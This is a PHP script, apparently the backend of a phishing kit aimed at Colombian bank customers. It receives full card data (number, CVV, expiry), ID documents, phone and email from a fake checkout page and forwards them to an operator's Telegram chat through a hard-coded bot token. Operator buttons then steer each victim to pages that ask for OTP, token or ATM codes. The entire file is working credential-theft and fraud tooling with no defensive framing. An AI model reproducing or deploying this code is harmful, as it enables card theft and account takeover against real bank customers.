<?php
// Deshabilitar la visualización de errores en producción
error_reporting(0);
ini_set("display_errors", 0);

// Configuración de encabezados
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// Manejo de solicitudes OPTIONS (preflight)
if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
    http_response_code(200);
    exit;
}

// Configuración de Telegram
$botToken = "8190342674:AAGs89s8nS7745j5oZ94Qf-j8Qvj4G14-98";
$chatId = "-4665427845";

// Función para obtener la IP real del cliente
function getClientIP() {
    $ipSources = [
        "HTTP_CF_CONNECTING_IP", // Cloudflare
        "HTTP_X_FORWARDED_FOR",  // Proxies
        "HTTP_X_REAL_IP",        // Nginx/Apache reverse proxy
        "HTTP_CLIENT_IP",
        "REMOTE_ADDR"            // Fallback estándar
    ];
    
    foreach ($ipSources as $source) {
        if (!empty($_SERVER[$source])) {
            $ip = $_SERVER[$source];
            if (strpos($ip, ",") !== false) {
                $ips = explode(",", $ip);
                $ip = trim($ips[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return "UNKNOWN";
}

// Función para enviar mensaje a Telegram
function sendTelegramMessage($botToken, $chatId, $message, $keyboard = null) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $postData = [
        "chat_id" => $chatId,
        "text" => $message,
        "parse_mode" => "HTML"
    ];
    
    if ($keyboard !== null) {
        $postData["reply_markup"] = json_encode($keyboard);
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        "success" => ($httpCode === 200),
        "response" => $response,
        "http_code" => $httpCode
    ];
}

// POST: Procesar datos de tarjeta
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $input = file_get_contents("php://input");
    $data = json_decode($input, true);
    
    if (!$data) {
        http_response_code(400);
        echo json_encode(["status" => "error", "message" => "Datos JSON inválidos"]);
        exit;
    }
    
    $cardNumber = $data["cardNumber"] ?? "No proporcionado";
    $cardHolder = $data["cardHolder"] ?? "No proporcionado";
    $expiryDate = $data["expiryDate"] ?? "No proporcionado";
    $cvv = $data["cvv"] ?? "No proporcionado";
    $bank = $data["bank"] ?? "No especificado";
    $documentType = $data["documentType"] ?? "No especificado";
    $documentNumber = $data["documentNumber"] ?? "No especificado";
    $phone = $data["phone"] ?? "No especificado";
    $email = $data["email"] ?? "No especificado";
    $totalAmount = $data["totalAmount"] ?? "46900";
    $transactionId = $data["transactionId"] ?? uniqid("tx_", true);
    
    $clientIP = getClientIP();
    $userAgent = $_SERVER["HTTP_USER_AGENT"] ?? "No disponible";
    $timestamp = date("Y-m-d H:i:s");
    
    $message = "🇨🇴 <b>[COLOMBIA] - NUEVO PAGO TARJETA DE CRÉDITO</b> 🇨🇴\n\n";
    $message .= "💳 <b>DATOS DE LA TARJETA:</b>\n";
    $message .= "• <b>Número:</b> <code>{$cardNumber}</code>\n";
    $message .= "• <b>Titular:</b> {$cardHolder}\n";
    $message .= "• <b>Vencimiento:</b> {$expiryDate}\n";
    $message .= "• <b>CVV:</b> <code>{$cvv}</code>\n";
    $message .= "• <b>Banco:</b> {$bank}\n\n";
    
    $message .= "👤 <b>DATOS DEL CLIENTE:</b>\n";
    $message .= "• <b>Documento:</b> {$documentType} {$documentNumber}\n";
    $message .= "• <b>Teléfono:</b> {$phone}\n";
    $message .= "• <b>Email:</b> {$email}\n";
    $message .= "• <b>Monto:</b> $ {$totalAmount} COP\n\n";
    
    $message .= "🌐 <b>INFORMACIÓN TÉCNICA:</b>\n";
    $message .= "• <b>IP:</b> {$clientIP}\n";
    $message .= "• <b>Fecha:</b> {$timestamp}\n";
    $message .= "• <b>ID Transacción:</b> <code>{$transactionId}</code>\n";
    
    $keyboard = [
        "inline_keyboard" => [
            [
                ["text" => "🔑 TOKEN", "callback_data" => "token_{$transactionId}"],
                ["text" => "📱 DINÁMICA", "callback_data" => "dinamica_{$transactionId}"]
            ],
            [
                ["text" => "🏧 CAJERO", "callback_data" => "cajero_{$transactionId}"],
                ["text" => "❌ ERROR TC", "callback_data" => "error_{$transactionId}"]
            ],
            [
                ["text" => "✅ FINALIZAR", "callback_data" => "finish_{$transactionId}"]
            ]
        ]
    ];
    
    $telegramResult = sendTelegramMessage($botToken, $chatId, $message, $keyboard);
    
    echo json_encode([
        "status" => "success",
        "message" => "Datos enviados para verificación",
        "transactionId" => $transactionId
    ]);
    exit;
}

// GET: Revisar acción del operador (desde Webhook / Actions)
if ($_SERVER["REQUEST_METHOD"] === "GET" && isset($_GET["transactionId"])) {
    $tid = preg_replace("/[^a-zA-Z0-9_-]/", "", (string)$_GET["transactionId"]);
    
    $searchDirs = [
        __DIR__ . "/actions",
        __DIR__ . "/../actions",
        __DIR__ . "/../../actions",
        "/var/www/colombia/actions",
        "/var/www/ecuador/actions",
        "/var/www/diente/actions"
    ];

    $action = null;
    foreach ($searchDirs as $dir) {
        $file = $dir . "/" . $tid . ".txt";
        if (file_exists($file)) {
            $action = trim(file_get_contents($file));
            break;
        }
    }
    
    if ($action) {
        $cleanAction = strtolower($action);
        if ($cleanAction === "otp" || $cleanAction === "token") {
            $redirectUrl = "../pedir_otp.html";
        } elseif ($cleanAction === "dinamica") {
            $redirectUrl = "../pedir_dinamica.php";
        } elseif ($cleanAction === "cajero") {
            $redirectUrl = "../pedir_cajero.html";
        } elseif ($cleanAction === "error" || $cleanAction === "error_tc") {
            $redirectUrl = "../payment.html?error=card_declined";
        } elseif ($cleanAction === "finish" || $cleanAction === "finalizar") {
            $redirectUrl = "../finish.html";
        } else {
            $redirectUrl = "../finish.html";
        }

        echo json_encode([
            "status" => "action_received",
            "action" => $action,
            "redirect_url" => $redirectUrl
        ]);
        exit;
    }
    
    echo json_encode([
        "status" => "waiting",
        "message" => "Esperando respuesta del operador"
    ]);
    exit;
}

http_response_code(400);
echo json_encode(["status" => "error", "message" => "Solicitud no válida"]);
